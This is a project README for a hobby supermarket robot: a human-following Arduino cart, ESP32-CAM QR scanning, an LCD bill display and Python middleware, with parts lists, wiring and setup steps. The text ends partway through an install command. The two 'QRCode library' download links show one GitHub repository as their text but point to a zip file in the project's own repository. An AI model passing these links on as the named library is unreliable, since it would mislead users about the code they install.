# Super Market Assist Bot

A smart supermarket assistance system featuring:
- Human-following robotic cart
- QR code scanning for product identification
- Real-time bill calculation
- LCD display for customer feedback

## Components
1. **Human Following Bot** - Arduino-based cart that follows customers
2. **ESP32 Camera Module** - Captures and streams product QR codes
3. **ESP32 Board with LCD** - Displays product information and total bill
4. **Python Middleware** - Processes QR codes and communicates between components

## Hardware Requirements
- ESP32 development board
- ESP32 Camera module (OV2640 recommended)
- Arduino UNO with motor shield
- 16x2 I2C LCD display
- HC-SR04 Ultrasonic sensors (for human following)
- 4 DC motors with wheels
- 7.4V LiPo battery or power bank
- Jumper wires and breadboard

## Software Requirements
- Arduino IDE 2.0+
- Python 3.8+
- Required libraries:
  - For Arduino:
    - NewPing.h (for ultrasonic sensors)
    - AFMotor.h (Adafruit Motor Shield)
    - LiquidCrystal_I2C.h (for LCD)
    - [QRCode Library]([https://github.com/ricmoo/QRCode](https://github.com/gayan-tharuka/Super-Market-Assist-Bot/blob/main/esp32cam-main.zip)) (for ESP32)
  - For Python:
    - OpenCV
    - NumPy
    - PyZBar

## Setup Instructions

### 1. Installing QR Library in Arduino IDE
1. Download the QRCode library from: [https://github.com/gayan-tharuka/QRCode](https://github.com/gayan-tharuka/Super-Market-Assist-Bot/blob/main/esp32cam-main.zip)
2. In Arduino IDE:
   - Go to Sketch > Include Library > Add .ZIP Library
   - Select the downloaded ZIP file
   - Alternatively, extract to your Arduino libraries folder:
     - Windows: `Documents\Arduino\libraries\`
     - Mac: `~/Documents/Arduino/libraries/`
     - Linux: `~/Arduino/libraries/`

### 2. Human Following Bot
1. Upload `human_follow_bot_code.ino` to Arduino
2. Connections:
   - Ultrasonic Sensor:
     - VCC → 5V
     - Trig → A1
     - Echo → A0
     - GND → GND
   - Motors:
     - M1-M4 → Motor shield outputs
   - Servo → Pin 10

### 3. ESP32 Camera Module
1. Upload `esp32_cam_module_code.ino` to ESP32-CAM
2. Select board: "AI Thinker ESP32-CAM"
3. Note the IP address shown in Serial Monitor after upload
4. Camera connections are pre-defined for AI Thinker module

### 4. ESP32 Board with LCD
1. Upload `esp32_board_code.ino` to ESP32
2. Connections:
   - LCD I2C:
     - SDA → GPIO21
     - SCL → GPIO22
     - VCC → 5V
     - GND → GND
3. Update WiFi credentials in code

### 5. Python Middleware
1. Install requirements:
   ```bash
   pip install opencv-python numpy pyzbar
